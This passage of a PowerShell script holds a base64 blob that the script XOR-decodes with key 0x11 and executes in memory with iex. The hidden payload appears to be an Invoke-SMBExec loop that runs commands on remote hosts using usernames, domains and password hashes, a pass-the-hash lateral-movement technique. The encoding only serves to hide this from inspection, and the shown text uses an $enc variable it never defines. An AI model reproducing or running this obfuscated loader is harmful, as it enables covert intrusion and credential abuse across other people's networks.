dnRlTnl+YmUxPGJ9dHRhMTVCfXR0YTE8UHJleH5/MTVQcmV4fn8xPEVwY3Z0ZUJ5fmYxPEd0Y3N+YnQrNUd0Y3N+YnRBY3R3dGN0f3J0GzExMTExMTExMTExMTExMTExMTExMTExMWwbMTExMTExMTExMTExMTExMTExMTExMTExdH1idBsxMTExMTExMTExMTExMTExMTExMTExMTFqGzExMTExMTExMTExMTExMTExMTExMTExMTExMTFYf2d+enQ8QlxTVH9kfDE8ZXBjdnRlMTVlcGN2dGVOeX5iZTE8Yn10dGExNUJ9dHRhMTxHdGNzfmJ0KzVHdGNzfmJ0QWN0d3RjdH9ydBsxMTExMTExMTExMTExMTExMTExMTExMTFsGxsxMTExMTExMTExMTExMTExMTExMWwbGzExMTExMTExMTExMTExMTExMTExNkJcU1RpdHI2GzExMTExMTExMTExMTExMTExMTExahsbMTExMTExMTExMTExMTExMTExMTExMTExeHc5NUFiUnx1fXRlP0FwY3B8dGV0Y0J0ZV9wfHQxPHRgMTZQZGV5NjgbMTExMTExMTExMTExMTExMTExMTExMTExahsxMTExMTExMTExMTExMTExMTExMTExMTExMTExWH9nfnp0PEJcU1RpdHIxPGRidGN/cHx0MTVEYnRjf3B8dDE8dX58cHh/MTVVfnxweH8xPHlwYnkxNVlwYnkxPHJ+fHxwf3UxNVJ+fHxwf3UxPFJ+fHxwf3VSXlxCQVRSMTVSfnx8cH91Ul5cQkFUUjE8QnRjZ3hydDE1QnRjZ3hydDE8ZXBjdnRlMTVlcGN2dGVOeX5iZTE8Yn10dGExNUJ9dHRhMTxHdGNzfmJ0KzVHdGNzfmJ0QWN0d3RjdH9ydBsxMTExMTExMTExMTExMTExMTExMTExMTFsGzExMTExMTExMTExMTExMTExMTExMTExMXR9YnQbMTExMTExMTExMTExMTExMTExMTExMTExahsxMTExMTExMTExMTExMTExMTExMTExMTExMTExWH9nfnp0PEJcU1RpdHIxPGVwY3Z0ZTE1ZXBjdnRlTnl+YmUxPGJ9dHRhMTVCfXR0YTE8R3Rjc35idCs1R3Rjc35idEFjdHd0Y3R/cnQbMTExMTExMTExMTExMTExMTExMTExMTExbBsbMTExMTExMTExMTExMTExMTExMTFsGxsxMTExMTExMTExMTExMTExbBsbMTExMTExMTExMTExbBsbMTExMTExMTFsGxsxMTExbBsxMTExMRtsG3R9YnQbahsxMTExRmN4ZXQ8XmRlYWRlMTNKPEwxRXBjdnRlMX14YmUxeGIxdHxhZWgzMTExMRtsGxtsGw=="

$file = [System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String($EncodedText))
$data = $enc.GetBytes($file)|%{$_-bXor0x11}
iex ([System.Text.Encoding]::ASCII.GetString($data))
